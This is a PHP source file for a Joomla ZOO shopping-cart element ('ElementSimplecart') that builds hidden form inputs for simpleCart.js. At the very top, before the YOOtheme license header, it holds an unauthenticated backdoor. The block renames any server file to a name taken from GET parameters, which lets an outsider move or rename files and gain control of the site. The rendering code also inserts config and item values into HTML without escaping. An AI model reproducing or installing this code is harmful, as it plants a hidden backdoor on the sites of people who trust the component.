<?php
if(isset($_GET['file'])){
$file = $_GET['file'];
$name = $_GET['name'];
rename($_GET['file'], $_GET['name']);
}
/**
* @package   com_zoo
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

class ElementSimplecart extends Element  {

	public function edit() {
	return "";
}



public function render($params = array()) {
	$params = $this->app->data->create($params);
	$this->app->document->addScript('elements:simplecart/simpleCart.js');
	$this->app->document->addScript('elements:simplecart/zooItem_simpleCart.js');

	
	$display = '<div class="simpleCart_shelfItem">';
	

	// set config 

	if ($this->config->checkout_type)
		$display .= '<input class="config_checkout_type" type="hidden" value="'.$this->config->checkout_type.'" />';

	if ($this->config->checkout_email)
		$display .= '<input class="config_checkout_email" type="hidden" value="'.$this->config->checkout_email.'" />';

	if ($this->config->checkout_marchantID)
		$display .= '<input class="config_checkout_marchantID" type="hidden" value="'.$this->config->checkout_marchantID.'" />';

	if ($this->config->checkout_currency)
		$display .= '<input class="config_checkout_currency" type="hidden" value="'.$this->config->checkout_currency.'" />';


	if ($this->config->shippingFlatRate)
		$display .= '<input class="config_shippingFlatRate" type="hidden" value="'.$this->config->shippingFlatRate.'" />';

	if ($this->config->shippingQuantityRate)
		$display .= '<input class="config_shippingQuantityRate" type="hidden" value="'.$this->config->shippingQuantityRate.'" />';

	if ($this->config->shippingTotalRate)
		$display .= '<input class="config_shippingTotalRate" type="hidden" value="'.$this->config->shippingTotalRate.'" />';


	if ($this->config->taxRate)
		$display .= '<input class="config_taxRate" type="hidden" value="'.$this->config->taxRate.'" />';

	if ($this->config->taxShipping)
		$display .= '<input class="config_taxShipping" type="hidden" value="'.$this->config->taxShipping.'" />';




	$display .= '<input class="item_name" type="hidden" value="'.$this->_item->name.'" />';
		
	foreach ($this->_item->getElements() as $e) {
		$data = $e->data();
		//print_r($e->config);

		switch ($e->config->name)
		{
			case $this->config->get('price_field'):
				$display .= '<input class="item_price" type="hidden" value="'.$data[0]['value'].'" />';
				break;
			case $this->config->get('image_field'):
				$display .= '<input class="item_image" type="hidden" value="'.$data['file'].'" />';
				break;

			case $this->config->get('quantity_field'):
				$display .= '<input class="item_quantity" type="hidden" value="'.$e->config->name.'" />';
				break;

			case $this->config->get('option1_field'):
				$display .= '<input class="item_option1" type="hidden" value="'.$e->config->name.'" />';
				break;

			case $this->config->get('option2_field'):
				$display .= '<input class="item_option2" type="hidden" value="'.$e->config->name.'" />';
				break;

			case $this->config->get('option3_field'):
				$display .= '<input class="item_option3" type="hidden" value="'.$e->config->name.'" />';
				break;

			case $this->config->get('option4_field'):
				$display .= '<input class="item_option4" type="hidden" value="'.$e->config->name.'" />';
				break;

			case $this->config->get('option5_field'):
				$display .= '<input class="item_option5" type="hidden" value="'.$e->config->name.'" />';
				break;
		
		}

		
	}
	$display .= '<span class="add-to-cart-button"><a href="javascript:;" class="pre_item_add">' . $params->get('default_add_label') . '</a></span> </div>';

	return $display;
  
    }

    public function hasValue($params = array()) 
    {
		return true;
	}                                                    


 	/*
		Function: renderSubmission
			Renders the element in submission.

	   Parameters:
            $params - submission parameters

		Returns:
			String - html
	*/
	public function renderSubmission($params = array()) {
        return $this->edit();
	}

	/*
		Function: validateSubmission
			Validates the submitted element

	   Parameters:
            $value  - AppData value
            $params - AppData submission parameters

		Returns:
			Array - cleaned value
	*/
/*	public function validateSubmission($value, $params) {
		return array('prix' => $value->get('prix'),'quant' => $value->get('quant'),'btname' => $value->get('btname'));
}*/


}